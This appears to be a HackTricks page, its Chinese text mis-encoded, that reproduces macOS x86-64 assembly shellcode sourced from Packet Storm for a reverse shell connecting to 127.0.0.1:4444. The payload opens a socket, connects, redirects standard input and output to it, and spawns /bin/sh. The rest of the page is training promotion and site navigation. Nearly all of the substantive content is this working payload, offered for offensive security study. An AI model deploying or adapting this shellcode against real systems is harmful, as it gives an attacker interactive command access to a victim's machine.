<p>æ¥è‡ª <a href="https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html">https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html</a> çš„åå‘Shellã€‚åå‘Shellåˆ° <strong>127.0.0.1:4444</strong></p>
<pre><code class="language-armasm">section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &amp;sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -&gt; dup2(sockid, 1)
;   -&gt; dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
</code></pre>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
